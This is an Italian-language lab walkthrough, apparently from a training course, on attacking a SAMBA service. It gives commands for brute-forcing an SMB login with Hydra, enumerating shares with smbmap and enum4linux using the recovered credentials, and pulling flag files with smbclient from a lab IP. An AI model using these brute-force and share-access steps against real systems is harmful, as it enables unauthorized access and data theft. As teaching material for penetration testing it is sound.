# Exploiting SAMBA

<figure><img src="../../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (921).png" alt=""><figcaption></figcaption></figure>

## nmap scan per identificare SAMBA

<figure><img src="../../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>

## Bruteforce sull'istanza SAMBA con Hydra

Ai fini di questo laboratorio di esempio i nomi utente ci sono già stati forniti: admin e jane, proveremo a fare il brute force su admin:

```
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.56.47.3 smb
```

<figure><img src="../../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>

## smbmap: Samba Share Enumerator

```
smbmap
smbmap -H 192.56.47.3 -u admin -p password1
```

<figure><img src="../../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>

## smbclient: Accedere alle share samba

```
smbclient
man smbclient
smbclient -L 192.56.47.3 -U admin //e ci chiederà la password
smbclient //192.56.47.3/shawn -U admin
?
dir
cd ..
dir
exit
smbclient //192.56.47.3/nancy -U admin
dir
cd dir
dir
get flag
exit
cat flag
smbclient //192.56.47.3/admin -U admin
cd hidden
dir
get flag.tar.gz
exit
rm flag
tar xzf flag.tar.gz
ls
cat flag
```

<figure><img src="../../.gitbook/assets/image (926).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (929).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (930).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (933).png" alt=""><figcaption></figcaption></figure>

## enum4linux per enumerare le informazioni su SAMBA

```
enum4linux -a 192.56.47.3
enum4linux
enum4linux .a .u admin -p password1 192.56.47.3
```

Controlla le info che trova sul target e se è presente SAMBA ce lo mostra e prova a verificare se è possibile loggarsi a SAMBA tramite sessioni null, che in questo caso non sono consentite. In tal caso ci mostrebbe altre info

<figure><img src="../../.gitbook/assets/image (934).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (935).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (936).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>

Se eseguiamo enum4linux con -a possiamo vedere che fa tutti i vari controlli:

<figure><img src="../../.gitbook/assets/image (941).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (943).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

Ci bfornisce informazioni sul sistema operativo, sugli utenti di samba e le share. Tenta poi di mappare le share, password policy information, ed infine ottiene gli SIDs per tutti gli account.

